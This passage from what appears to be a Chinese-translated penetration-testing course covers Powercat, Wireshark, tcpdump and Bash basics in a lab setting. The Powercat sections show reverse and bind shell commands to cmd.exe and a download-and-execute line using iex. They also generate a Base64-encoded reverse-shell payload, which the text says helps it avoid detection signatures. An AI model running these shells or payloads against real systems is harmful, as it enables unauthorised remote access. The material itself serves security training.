的机器上用 Netcat 连接到它，就像我们用其他的 Shell 一样。我们包括 Netcat 的 `-v` 选项，因为我们的正向 Shell 在第一连接时不一定会出现命令提示。\n\n```bash\nkali@kali:~$ nc -nv 10.11.0.22 443\n(UNKNOWN) [10.11.0.22] 443 (https) open\nipconfig\nWindows IP Configuration\nEthernet adapter Local Area Connection:\n Connection-specific DNS Suffix . :\n IPv4 Address. . . . . . . . . . . : 10.11.0.22\n Subnet Mask . . . . . . . . . . . : 255.255.255.0\n Default Gateway . . . . . . . . . : 10.11.0.1\n\nC:\\\\Users\\\\offsec>\n```\n\nPowerShell 强大得令人发指，我们甚至还没有接近它的功能的表面。由于微软越来越多地将 PowerShell 用于基于 Windows 的管理和自动化，知道如何正确使用 PwerShell 来实现我们的目标是极其重要的。请参考微软 PowerShell 文档和微软 [System.Net](http://System.Net) 参考，以了解更多的类和方法，以及网上提供的各种 PowerShell 培训和讲座。\n\n### Powercat\n\nPowercat 本质上是由 Besimorhino 编写的 Netcat 的 PowerShell 版本。它是一个我们可以下载到 Windows 主机上的脚本，以利用 PowerShell 的优势，并简化了正向/反向 Shell 的创建。\n\n<aside> 💡 Powercat 可以通过 apt install powercat 在 Kali 中安装，它将把脚本放在 /usr/share/windows-resources/powercat 中。\n\n</aside>\n\n我们可以跳过第一步，即把脚本从我们的 Kali Linux 机器转移到 Windows 主机，因为我们已经熟悉了文件传输。\n\n在目标主机上的脚本，我们首先使用 PowerShell 的一个功能，即 Dot-sourcing 来加载 powercat.ps1 脚本。这将使脚本中声明的所有变量和函数在当前 PowerShell 范围内可以用。通过这种方式，我们可以在 PowerShell 中直接使用 Powercat 函数，而不是每次都执行该脚本。\n\n```bash\nPS C:\\\\Users\\\\Offsec> . .\\\\powercat.ps1\n```\n\n如果目标机器连接到互联网，我们可以再次使用方便的 iex cmdlet，用远程脚本做同样的事情，如下所示：\n\n```bash\nPS C:\\\\Users\\\\Offsec> iex (New-Object System.Net.Webclient).DownloadString('<https://raw.githubusercontent.com/besimorhino/po> wercat/master/powercat.ps1')\n```\n\n值得注意的是，以这种方式加载的脚本只能在当前的 PowerShell 实例中使用，而且每次我们重启 PwerShell 时都需要重新加载。\n\n现在我们的脚本已经加载完毕，我们可以按如下方式执行 powercat。\n\n```bash\nPS C:\\\\Users\\\\offsec> powercat\nYou must select either client mode (-c) or listen mode (-l).\n```\n\n我们可以通过查看帮助菜单快速熟悉 Powercat：\n\n```bash\nPS C:\\\\Users\\\\offsec> powercat -h\npowercat - Netcat, The Powershell Version\nGithub Repository: <https://github.com/besimorhino/powercat>\nThis script attempts to implement the features of netcat in a powershell\nscript. It also contains extra features such as built-in relays, execute\npowershell, and a dnscat2 client.\nUsage: powercat [-c or -l] [-p port] [options]\n -c <ip> Client Mode. Provide the IP of the system you wish to connect to.\n If you are using -dns, specify the DNS Server to send queries to.\n -l Listen Mode. Start a listener on the port specified by -p.\n -p <port> Port. The port to connect to, or the port to listen on.\n -e <proc> Execute. Specify the name of the process to start.\n...\n -i <input> Input. Provide data to be sent down the pipe as soon as a connection\n established. Used for moving files. You can provide the path to a fi\n a byte array object, or a string. You can also pipe any of those int\npowercat, like 'aaaaaa' | powercat -c 10.1.1.1 -p 80\n...\n -g Generate Payload. Returns a script as a string which will execute t\n powercat with the options you have specified. -i, -d, and -rep will\n be incorporated.\n -ge Generate Encoded Payload. Does the same as -g, but returns a string\n can be executed in this way: powershell -E <encoded string>\n -h Print this help message.\n...\n```\n\n让我们回顾一下我们如何使用 powercat 进行文件传输，并像以前的工具那样进行正向和反向 Shell。\n\n### Powercat 文件传输\n\n尽管我们可以使用前面讨论的任何工具将 Powercat 传输到我们的目标，让我们看看如何使用 powercat 将自己（powercat.ps1）从 Bob 传输到 Alice，作为演示用 powercat 传输文件的方法。\n\n首先，我们在 Alice 的电脑上运行一个 Netcat 监听器。\n\n```bash\nkali@kali:~$ sudo nc -lnvp 443 > receiving_powercat.ps1\nlistening on [any] 443 ...\nconnect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 63661\n```\n\n接下来，我们将在 Bob 的电脑上调用 powercat。 `-c` 选项指定了客户端模式并设置了监听 IP 地址， `-p` 指定了连接的端口号， `-i`  表示将被远程传输的本地文件。\n\n```bash\nPS C:\\\\Users\\\\Offsec> powercat -c 10.11.0.4 -p 443 -i C:\\\\Users\\\\Offsec\\\\powercat.ps1\n```\n\n最后， Alice 将 kill Netcat 进程，并检查文件是否已经收到。\n\n```bash\n^C\nkali@kali:~$ ls receiving_powercat.ps1\nreceiving_powercat.ps1\n```\n\n### Powercat 反向 Shell\n\n反向 Shell 的过程与我们已经看到的类似。我们将在 Alice 的计算机上启动一个 Netcat 监听器。然后 Bob 将使用 powercat 来发送一个反向 shell。\n\n我们从 Alice 的机器上的 Netcat 监听器开始：\n\n```bash\nkali@kali:~$ sudo nc -lvp 443\nlistening on [any] 443 ...\n```\n\n接下来，Bob 将使用 powercat 来发送一个反向 shell。在这个例子中， `-e` 选项指定了一旦连接到一个监听端口时要执行的应用程序（cmd.exe）。\n\n```bash\nPS C:\\\\Users\\\\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe\n```\n\n最后，Alice 的 Netcat 监听器将收到 shell。\n\n```bash\nconnect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 63699\nMicrosoft Windows [Version 10.0.17134.590]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\\\Users\\\\offsec>\n```\n\n### Powercat 正向 Shell\n\n相比之下，powercat 正向 shell 是在 Bob 那边用 powercat 监听器启动的。我们将使用 `-l` 选项来创建一个监听器， `-p` 指定监听端口号， `-e` 在连接后执行一个应用程序（cmd.exe）。\n\n```bash\nPS C:\\\\Users\\\\offsec> powercat -l -p 443 -e cmd.exe\n```\n\n接下来，Alice 将创建一个 Netcat 连接到 Bob 的计算机上的正向 shell。\n\n```bash\nkali@kali:~$ nc 10.11.0.22 443\nMicrosoft Windows [Version 10.0.17134.590]\n(c) 2018 Microsoft Corporation. All rights reserved.\n\nC:\\\\Users\\\\offsec>\n```\n\n### Powercat 独立 Payload\n\nPowercat 还可以生成独立的 Payload。在 powercat 的上下文中，payload 是一组 powershell 指令以及仅包含用户请求的功能的 powercat 脚本本身的部分，只包括用户要求的功能。让我们在下一个例子中试验一下 payload。\n\n在 Alice 的机器上启动监听器后，我们通过在之前的 powercat 命令中添加 `-g` 选项并将输出重定向到一个文件来创建一个独立的反向 shell payload。这将产生一个 powershell 脚本，Bob 可以在他的电脑上执行。\n\n```bash\nPS C:\\\\Users\\\\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -g > reverseshell.ps1\n\nPS C:\\\\Users\\\\offsec> ./reverseshell.ps1\n```\n\n值得注意的是，像这种独立的 payload 可能很容易被 IDS 发现。具体而言，生成的脚本相当大，大约有 300 行代码。此外，它还包含一个硬编码的字符串，可以很容易地用于恶意活动的签名中。虽然识别任何具体的签名不在本模块的范围内，但足以说明像这样的纯文本恶意代码可能会有一个很差的成功率，并可能被防御性软件解决方案给拦截。\n\n我们可以尝试通过利用 PowerShell 执行 Base64 编码命令的能力来解决这个问题。为了生成一个独立的编码的 Payload，我们使用 `-ge` 选项，并再次将输出重定向到一个文件。\n\n```bash\nPS C:\\\\Users\\\\offsec> powercat -c 10.11.0.4 -p 443 -e cmd.exe -ge > encodedreverseshell.ps1\n```\n\n该文件包含一个编码字符串，可以使用 PowerShell -E（EncodedCommand）选项来执行。然而，由于 `-E` 选项被设计为一种在命令行上提交复杂命令的方式，所产生的 encodedreverseshell.ps1 脚本不能像我们的未编码的 Payload 一样被执行。相反，Bob 需要将整个编码的字符串传递给 powershell.exe -E。\n\n```bash\nPS C:\\\\Users\\\\offsec> powershell.exe -E\nZgB1AG4AYwB0AGkAbwBuACAAUwB0AHIAZQBhAG0AMQBfAFMAZQB0AHUAcAAKAHsACgAKACAAIAAgACAAcABhAH\nIAYQBtACgAJABGAHUAbgBjAFMAZQB0AHUAcABWAGEAcgBzACkACgAgACAAIAAgACQAYwAsACQAbAAsACQAcAAs\nACQAdAAgAD0AIAAkAEYAdQBuAGMAUwBlAHQAdQBwAFYAYQByAHMACgAgACAAIAAgAGkAZgAoACQAZwBsAG8AYg\nBhAGwAOgBWAGUAcgBiAG8AcwBlACkAewAkAFYAZQByAGIAbwBzAGUAIAA9ACAAJABUAHIAdQBlAH0ACgAgACAA\nIAAgACQARgB1AG4AYwBWAGEAcgBzACAAPQAgAEAAewB9AAoAIAAgACAAIABpAGYAKAAhACQAbAApAAoAIAAgAC\nAAIAB7AAoAIAAgACAAIAAgACAAJABGAHUAbgBjAFYAYQByAHMAWwAiAGwAIgBdACAAPQAgACQARgBhAGwAcwBl\nAAoAIAAgACAAIAAgACAAJABTAG8AYwBrAGUAdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdA\nBlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAGMAcABDAGwAaQBlAG4AdAAKACAAIAAgACA\n...\n```\n\n在运行独立的 Payload 后，Alice 在她等待的监听器上收到了反向 Shell。\n\n```bash\nkali@kali:~$ sudo nc -lnvp 443\nlistening on [any] 443 ...\nconnect to [10.11.0.4] from (UNKNOWN) [10.11.0.22] 43725\n\nPS C:\\\\Users\\\\offsec>\n```\n\n我们已经介绍了各种可以处理文件传输、正向 Shell 和 反向 Shell 的工具。这些工具在渗透测试中具有不同的特点、优势、弱点和适用性。你可以自己测试一下 powercat 的功能，以完善你对这个伟大工具系列的接触。\n\n## Wireshark\n\n一个合格的渗透测试员应该精通网络基础只是。网络嗅探器，如业界主要的 Wireshark，是学习网络协议、分析网络流量和调试网络服务的必备工具。在本节中，我们将讨论一些 Wireshark 的基础知识。\n\n### Wireshark 基础知识\n\nWireshark 使用 Libpcap（在 Linux 上）或 Winpcap（在 Windows 上）库，以便从网络上捕获数据包。\n\n在用嗅探器分析网络流量时，很容易被收集的数据中的大量“噪音”所淹没。为了方便分析，我们可以在 Wireshark 中应用捕获过滤器和显示过滤器。如果我们在 Wireshark 会话中应用捕获过滤器，任何不符合过滤器标准的数据包将被丢弃，剩余的数据将被传递给捕获引擎。然后，捕获引擎对传入的数据包进行剖析，分析它们，最后在显示输出之前应用任何额外的显示过滤器。\n\n这个过程可以用下图来说明。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/80dc3f76-6a7f-4185-8d63-cc2e5ed98c65/Untitled.png)\n\n使用任何网络嗅探器（包括 Wireshark）的秘诀是学会如何使用捕获和显示过滤器来剥离多余的数据。幸运的是，Wiresahrk 的图形界面使得数据的可视化和各种过滤器的使用变得相对容易。\n\n### 启动 Wireshark\n\n在下面的例子中，我们将在匿名的 FTP 登录过程中捕获网络流量。在我们的 Kali 系统中，我们使用命令行启动 Wireshark，如下所示，或者通过应用程序菜单启动，它位于 Sniffing & Spoofing 子菜单下。\n\n```bash\nkali@kali:~$ sudo wireshark\n```\n\n### 捕获过滤器\n\n当 Wiresahrk 加载时，我们会看到一个基本的窗口，在这里我们可以选择我们要监控的网络接口，以及设置显示和捕获过滤器。如上所述，我们可以使用捕获过滤器，通过丢弃任何不符合我们的过滤器的流量来减少捕获的流量，并将我们的注意力缩小到我们希望分析的数据包。请注意，从捕获过滤器中排除的任何流量都会丢失，因此，如果你担心可能会丢失数据，最好定义广泛的捕获过滤器。\n\n我们首先选择我们想要监控的接口，然后输入一个捕获过滤器。在本例中，我们使用 net filter 来只捕获 10.11.1.0/24 地址范围内的流量。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/395e6991-68af-4fc5-8859-a8cdf146e299/Untitled.png)\n\n也可以通过导航到 Capture > Capture filters 来选择预定义的捕获过滤器，我们还可以通过点击 `+` 号来添加自己的捕获过滤器。设置好捕获过滤器后，我们可以从好用的接口列表中双击我们的网络接口（tap0）来开始捕获。\n\n### 显示过滤器\n\n现在 Wireshark 已经捕捉到了本地网络中的所有流量，我们可以登录到 FTP 服务器并检查这些流量。\n\n```bash\nkali@kali:~$ ftp 10.11.1.13\nConnected to 10.11.1.13.\n220 Microsoft FTP Service\nName (10.11.1.13:kali): anonymous\n331 Anonymous access allowed, send identity (e-mail name) as password.\nPassword:anonymous\n230 Anonymous user logged in.\nRemote system type is Windows_NT.\nftp> quit\n221\n```\n\n为了进一步缩小背景流量，让我们利用一个显示过滤器，只关注 FTP 协议。显示过滤器比捕获过滤器要灵活得多，而且语法也略有不同。顾名思义，显示过滤器只过滤被显示的数据包，而 Wireshark 继续在后台捕获 10.11.1.0/24 地址范围内的所有网络流量。正因为如此，我们可以通过点击显示过滤器右侧的 “X” 图标来清除显示过滤器，而不必重新开始捕获。与捕获过滤器一样，我们也可以通过点击分享 > 显示过滤器，从预定义的列表中选择一个过滤器。\n\n列表中选择一个过滤器。给我们应用一个显示过滤器，只显示 FTP 数据，或端口 21 的 TCP 流量。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8bba53ff-454d-4d21-964f-f1dfeb9cad33/Untitled.png)\n\n这个过滤器工作得非常好。现在我们可以清楚地看到 21 端口上只有 FTP 的流量。\n\n### 跟踪 TCP 流\n\nWireshark 允许我们查看网络流量，包括每个数据包的内容。然而，我们通常对各种应用之间的数据流更感兴趣。我们可以利用 Wireshark 的能力来重新组合一个特定的会话，并以各种格式显示。要查看一个特定的 TCP 数据流，我们可以右击一个感兴趣的数据包，例如在我们的 FTP 会话中包含 USER 命令的数据包，然后选择跟随 > TCP 流。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/8ea7eef6-0748-4b70-8c3f-2723eb4ec914/Untitled.png)\n\n重新组合的 TCP 流更容易阅读，我们可以回顾我们与 FTP 服务器的互动。因为 FTP 是一个明文协议，我们可以看到 FTP 客户端发送和接收的命令和输出。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bc01cc48-bda3-4dbc-9309-3c79f70747be/Untitled.png)\n\n## Tcpdump\n\nTcpdump 是一个基于文本的网络嗅探器，尽管没有图形界面，但它精简、强大、灵活。它是迄今为止最常用的命令行数据包分析器，可以在大多数 Unix 和 Linux 操作系统上找到，但本地用户的权限决定了捕获网络流量的能力。\n\nTcpdump 既可以从网络上捕获流量，也可以读取现有的捕获文件。让我们看看 password_cracking_filered.pacp 文件中发生了什么，该文件时在防火墙上捕获的。下载该文件并跟随我们一起分析数据。首先，我们将用 sudo 启动 tcpdump（授予捕获权限），用 `-r` 选项打开文件。\n\n```bash\nkali@kali:~$ sudo tcpdump -r password_cracking_filtered.pcap\nreading from file password_cracking_filtered.pcap, link-type EN10MB (Ethernet)\n08:51:20.800917 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074,\nwin 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0\n08:51:20.800953 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389,\nack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr\n25538253,nop,wscale 4], length 0\n08:51:20.801023 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074,\nwin 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0\n08:51:20.801030 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389,\nack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr\n25538253,nop,wscale 4], length 0\n08:51:20.801048 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074,\nwin 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0\n08:51:20.801051 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389,\nack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr\n25538253,nop,wscale 4], length 0\n...\n```\n\n### 过滤流量\n\n一开始，输出结果有点让人不知所措，所以让我们试着通过使用 awk 和 sort 来更好地了解所涉及的 IP 地址和端口。\n\n首先，我们将使用 `-n` 选项来跳过 DNS 名称查询，使用 `-r` 来读取我们的数据包捕获文件。然后，我们可以用管道符将输出输入到 awk，打印出目标 IP 地址和端口（第三个空格分割的字符），并再次用管道符输入 sort 和 uniq -c，分别对该字段在捕获中出现的次数进行排序和计数。最后，我们用head 只显示输出的前 10 行。\n\n```bash\nkali@kali:~$ sudo tcpdump -n -r password_cracking_filtered.pcap | awk -F\" \" '{print\n$5}' | sort | uniq -c | head\n 20164 172.16.40.10.81:\n 14 208.68.234.99.32768:\n 14 208.68.234.99.32769:\n 6 208.68.234.99.32770:\n 14 208.68.234.99.32771:\n 6 208.68.234.99.32772:\n 6 208.68.234.99.32773:\n 15 208.68.234.99.32774:\n 12 208.68.234.99.32775:\n 6 208.68.234.99.32776:\n...\n```\n\n我们可以看到，172.16.40.10 是最常见的目标地址，其次是 208.68.234.99。鉴于 172.16.40.10 是通过低目的端口（81）联系的，而 208.68.234.99 是通过高目的端口联系的，我们可以正确地假设前者是服务器，后者是客户端。\n\n我们也可以安全地假设客户地址对服务器发出了许多请求，但为了不做过多的假设，我们可以使用过滤器来更仔细地检查流量。\n\n为了从命令行中进行过滤，我们将使用源主机（src host）和目的主机（dst host）过滤器，分别只输出源和目的流量。我们还可以通过端口号（-n port 81）进行过滤，以显示针对端口 81 的元流量和目的流量。现在让我们试试这些过滤器。\n\n```bash\nsudo tcpdump -n src host 172.16.40.10 -r password_cracking_filtered.pcap\n...\n08:51:20.801051 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389,\nack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr\n25538253,nop,wscale 4], length 0\n08:51:20.802053 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [.], ack 89, win 905,\noptions [nop,nop,TS val 71430591 ecr 25538253], length 0\n...\nsudo tcpdump -n dst host 172.16.40.10 -r password_cracking_filtered.pcap\n...\n08:51:20.801048 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074,\nwin 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0\n08:51:20.802026 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [.], ack 4166855390,\nwin 115, options [nop,nop,TS val 25538253 ecr 71430591], length 0\n...\nsudo tcpdump -n port 81 -r password_cracking_filtered.pcap\n...\n08:51:20.800917 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [S], seq 1855084074,\nwin 14600, options [mss 1460,sackOK,TS val 25538253 ecr 0,nop,wscale 7], length 0\n08:51:20.800953 IP 172.16.40.10.81 > 208.68.234.99.60509: Flags [S.], seq 4166855389,\nack 1855084075, win 14480, options [mss 1460,sackOK,TS val 71430591 ecr\n25538253,nop,wscale 4], length 0\n...\n```\n\n我们可以继续用各种命令行工具如 awk 和 grep 来处理这些过滤后的输出，但让我们继续前进，实际检查一些数据包，看看我们能发先生们样的细节。\n\n为了转储捕获的流量，我们将使用 `-X` 选项来打印 HEX 和 ASCII 格式的数据包。\n\n```bash\nkali@kali:~$ sudo tcpdump -nX -r password_cracking_filtered.pcap\n...\n08:51:25.043062 IP 208.68.234.99.33313 > 172.16.40.10.81: Flags [P.], seq 1:140, ack 1\n 0x0000: 4500 00bf 158c 4000 3906 9cea d044 ea63 E ....@.9....D.c\n 0x0010: ac10 280a 8221 0051 a726 a77c 6fd8 ee8a ..(..!.Q.&.|o...\n 0x0020: 8018 0073 1c76 0000 0101 080a 0185 b2f2 ...s.v ........\n 0x0030: 0441 f5e3 4745 5420 2f2f 6164 6d69 6e20 .A..GET.//admin.\n 0x0040: 4854 5450 2f31 2e31 0d0a 486f 7374 3a20 HTTP/1.1..Host:.\n 0x0050: 6164 6d69 6e2e 6d65 6761 636f 7270 6f6e admin.megacorpon\n 0x0060: 652e 636f 6d3a 3831 0d0a 5573 6572 2d41 e.com:81..User-A\n 0x0070: 6765 6e74 3a20 5465 6820 466f 7265 7374 gent:.Teh.Forest\n 0x0080: 204c 6f62 7374 6572 0d0a 4175 7468 6f72 .Lobster..Author\n 0x0090: 697a 6174 696f 6e3a 2042 6173 6963 2059 ization:.Basic.Y\n 0x00a0: 5752 7461 5734 3662 6d46 7562 3352 6c59 WRtaW46bmFub3RlY\n 0x00b0: 3268 7562 3278 765a 336b 780d 0a0d 0a 2hub2xvZ3kx ...\n...\n```\n\n我们立即注意到，81 号端口的 172.16.40.10 的流量看起来像 HTTP 数据。事实上，这些 HTTP 请求似乎包含基本 HTTP 认证数据，用户代理为 “Teh Forest Lobster”。这是一个非常明显的迹象，表明有一些奇怪的事情正在发生。\n\n为了揭开其余的神秘面纱，我们需要依靠先进的头信息过滤。\n\n### 高级标题过滤\n\n在这一点上，为了更好地检查转储中的请求和响应，我们想过滤掉并只显示数据包。要做到这一点，我们将寻找那些开启了 PSH 和 ACK 标志的数据包。在最初的 3 次握手后，所有发送和接收的数据包都将设置 ACK 标志。PSH 标志用于强制执行数据包的即时交付，通常用于交互式应用层协议以避免缓冲。\n\n下图描述了 TCP 头，表明 TCP 标志从第 14 个字符开始定义。\n\n![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2b624ee0-48b7-4956-878e-059a97ea0cca/Untitled.png)\n\n观察上图，我们可以看到 ACK 和 PSH 分别由第 14 字节的第四和第五位表示。\n\n```bash\nCEUAPRSF\nWCRCSSYI\nREGKHTNN\n00011000 = 24 in decimal\n```\n\n只打开这些位，我们就可以得到00011000，或十进制的 24。\n\n```bash\nkali@kali:~$ echo \"$((2#00011000))\"\n24\n```\n\n我们可以将这个数字与 ‘tcp[13] = 24’ 一起传递给 tcpdump 作为显示过滤器，以表明我们只想看到设置了 ACK 和 PSH 位的数据包（“数据包”），由 TCP 头的第 14 字节的第四和第五位（24）代表。请记住，用于计算字节数的 tcpdump 数组索引从 0 开始，所以语法应该是（tcp[13]）。\n\n这两个标志的组合将有望于只想我们显示 HTTP 请求和响应数据。下面是我们用来显示设置了 ACK 或 PSH 标志的数据包的命令。\n\n```bash\nkali@kali:~$ sudo tcpdump -A -n 'tcp[13] = 24' -r password_cracking_filtered.pcap\n06:51:20.802032 IP 208.68.234.99.60509 > 172.16.40.10.81: Flags [P.], seq 1855084075:1\nE ....@.9....D.c..(\n.].Qn.V+.]*....s1 .....\n....A..GET //admin HTTP/1.1\nHost: admin.megacorpone.com:81\nUser-Agent: Teh Forest Lobster\n\n...\nE ....@.@.....(\n.D.c.Q.^...E..?I ..........\n.A .....HTTP/1.1 401 Authorization Required\nDate: Mon, 22 Apr 2013 12:51:20 GMT\nServer: Apache/2.2.20 (Ubuntu)\nWWW-Authenticate: Basic realm=\"Password Protected Area\"\nVary: Accept-Encoding\nContent-Length: 488\nContent-Type: text/html; charset=iso-8859-1\n\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>401 Authorization Required</title>\n</head><body>\n<h1>Authorization Required</h1>\n<p>This server could not verify that you\nare authorized to access the document\nrequested. Either you supplied the wrong\ncredentials (e.g., bad password), or your\nbrowser doesn't understand how to supply\nthe credentials required.</p>\n<hr>\n<address>Apache/2.2.20 (Ubuntu) Server at admin.megacorpone.com Port 81</address>\n</body></html>\n\n...\n08:51:25.044432 IP 172.16.40.10.81 > 208.68.234.99.33313:\nE..s.m@.@..U..(\n.D.c.Q.!o....& .....^u.....\n.A .....HTTP/1.1 301 Moved Permanently\nDate: Mon, 22 Apr 2013 12:51:25 GMT\nServer: Apache/2.2.20 (Ubuntu)\nLocation: <http://admin.megacorpone.com:81/admin/>\nVary: Accept-Encoding\nContent-Length: 333\nContent-Type: text/html; charset=iso-8859-1\n\n<!DOCTYPE HTML PUBLIC \"-//IETF//DTD HTML 2.0//EN\">\n<html><head>\n<title>301 Moved Permanently</title>\n</head><body>\n<h1>Moved Permanently</h1>\n<p>The document has moved <a\nhref=\"<http://admin.megacorpone.com:81/admin/>\">here</a>.</p>\n<hr>\n<address>Apache/2.2.20 (Ubuntu) Server at admin.megacorpone.com Port 81</address>\n</body></html>\n```\n\n从这里，我们的故事变得更加清晰。我们看到有大量的验证 /admin 目录的失败尝试，结果是 HTTP 401 回复，而最后一次登录尝试似乎成功了，因为服务器回复了 HTTP 301 回复。看来有人获得了对 Megacorpone 的一台服务器的访问权！\n\n# Bash 脚本\n\nGUN Bourne-Again Shell（BASH）是一个强大的工作环境和脚本引擎。一个合格的安全专业化人员会熟练地利用 Bash 脚本来简化和自动化许多 Linux 任务和程序。在本模块中，我们将介绍 Bash 脚本，并探讨几个实际的场景。\n\n## Bash 脚本的介绍\n\nBash 脚本是一个包含一系列命令的纯文本文件，执行起来就像在终端提示符下输入的一样。一般来说，Bash 脚本有一个可选的扩展名 .sh（为了便于识别），以 #!/bin/bash 开头，在执行之前必须设置可执行权限。让我们从一个简单的 “Hello World” Bash 脚本开始。\n\n```bash\nkali@kali:~$ cat ./hello-world.sh\n#!/bin/bash\n# Hello World Bash Script\necho \"Hello World!\"\n```\n\n这个脚本有几个部分值得解释。\n\n- 第 1 行：#1 通常被称为 “shebang”，它被 Bash 解释器所忽略。第二部分，/bin/bash，是解释器的绝对路径，用来运行该脚本。这就是为什么这是一个 “Bash 脚本”，而不是其他类型的 shell 脚本，比如说 “C Shell” 脚本。\n- 第 2 行：# 是用来添加注释的，所以它后面的所有文字都被忽略了。\n- 第 3 行：echo “Hello World！” 使用 echo Linux 命令工具向终端打印一个给定的字符串，在本例中是 “Hello Wolrd！”。\n\n接下来，让我们把这个脚本变成可执行的并运行它。\n\n```bash\nkali@kali:~$ chmod +x hello-world.sh\n\nkali@kali:~$ ./hello-world.sh\nHello World!\n```\n\nchmod 命令和 +x 选项用来使脚本可执行，而 ./hello-world.sh 则用来实际运行它。./ 这个符号可能看起来很混乱，但这只是一个路径符号，表示这个脚本在当前目录下。每当我们输入一个命令时，Bash 都会试图在一系列存储在一个叫做 PATH 的变量中的目录中找到它。由于我们的主目录并不包括在这个变量中，所以我们必须使用相对路径来找到我们的 Bash 脚本，以使 Bash 能够“找到”它并运行它。\n\n现在我们已经创建了第一个 Bash 脚本，让我们更详细地探讨一下 Bash。\n\n## 变量\n\n变量是用来临时存储数据的命名场所。我们可以设置（或“声明”）一个变量，为其赋值，或读取一个变量，将其“扩展”或“解析”为其存储值。\n\n我们可以用多种方式声明变量值。最简单的方法是用一个简单的 name=vulue 声明直接设置值。注意，“=” 号前后都没有空格。\n\n```bash\nkali@kali:~$ first_name=Good\n```\n\n除非我们能够引用一个变量，否则声明该变量是毫无意义的。为了做到这一点，我们在变量前面加上 “$” 字符。每当 Bash 在命令中遇到这种语法时，它就会在执行前将变量名替换为其值（“扩展”变量）。\n\n```bash\nkali@kali:~$ first_name=Good\n\nkali@kali:~$ last_name=Hacker\n\nkali@kali:~$ echo $first_name $last_name\nGood Hacker\n```\n\n变量名可以是大写的，小写的，或者两者的混合。然而，Bash 是区分大小写的，所以我们在声明和扩展变量时必须保持一致。此外，使用描述性的变量名是一个很好的做法，这使得我们的脚本更容易阅读和维护。\n\n请注意，Bash 会以特定的方式解释某些字符。例如，这个声明展示了一个不恰当的多值变量声明：\n\n```bash\nkali@kali:~$ greeting=Hello World\nbash: World: command not found\n```\n\n这不一定是我们所期望的。为了解决这个问题，我们可以使用单引号（’）或双引号（”）来保卫我们的文本。然而，Bash 对单引号和双引号的处理方式不同。当遇到单引号时，Bash 会按字面意思解释每个被包围的字符。当遇到双引号时，除了 “$”、“’” 和 “\\” 之外，所有的字符都是按字面意思来理解的，这意味着在对所包含的文本进行初始替换时，变量将被展开。\n\n一个简单的变量将被展开。一个简单的例子将有助于澄清这一点。\n\n```bash\nkali@kali:~$ greeting='Hello World'\n\nkali@kali:~$ echo $greeting\nHello World\n\nkali@kali:~$ greeting2=\"New $greeting\"\n\nkali@kali:~$ echo $greeting2\nNew Hello World\n```\n\n在这个例子中，单引号封闭的 greeting 声明完全保留了我们的文本值，并且没有把空格截石位命令分隔符。然而，在 greeting2 的双引号声明中，Bash 将 $greeting 扩展为其值（“Hello World”），尊重了 “$” 字符的特殊含义。\n\n我们还可以将变量的值设置为一个命令或程序的结果。这就是所谓的命令替换，它允许我们把一个命令或程序的输出（通常会被打印到屏幕上）保存为一个变量的值。要做到这一点，将变量名称放在括号 “()” 中，前面加一个 “$” 字符。\n\n```bash\nkali@kali:~$ user=$(whoami)\n\nkali@kali:~$ echo $user\nkali\n```\n\n我们把 whoami 命令的输出分配给 user 变量。然后我们显示其值。使用反引号或严重字符 (`) 进行命令替换的另一种语法如下所示：\n\n```bash\nkali@kali:~$ user2=`whoami`\n\nkali@kali:~$ echo $user2\nkali\n```\n\n反引号方法较旧并且通常不鼓励使用，因为这两种命令替换方法的行为方式存在差异。同样重要的是要注意命令替换发生在子 shell 中，对子 shell 中的变量的更改不会改变来自主 shell 的变量过程。这在以下例子中进行了演示：\n\n```bash\nkali@kali:~$ cat ./subshell.sh\n\n#!/bin/bash -x\nvar1=value1\necho $var1\n\nvar2=value2\necho $var2\n\n$(var1=newvar1)\necho $var1\n\n`var2=newvar2`\necho $var2\n\nkali@kali:~$ ./subshell.sh\n+ var1=value1\n+ echo value1\nvalue1\n+ var2=value2\n+ echo value2\nvalue2\n++ var1=newvar1\n+ echo value1\nvalue1\n++ var2=newvar2\n+ echo value2\nvalue2\nkali@kali:~$\n```\n\n在这个例子中，首先注意我们改变了 shebang，加入了 `-x` 选项。这指示 Bash 打印额外的调试输出，所以我们可以更容易地看到被执行的命令和它们的结果。当我们查看这个输出时，注意到前面有一个 “+” 号的命令是在当前 shell 中执行的，前面有两个 “++” 号的命令是在子 shell 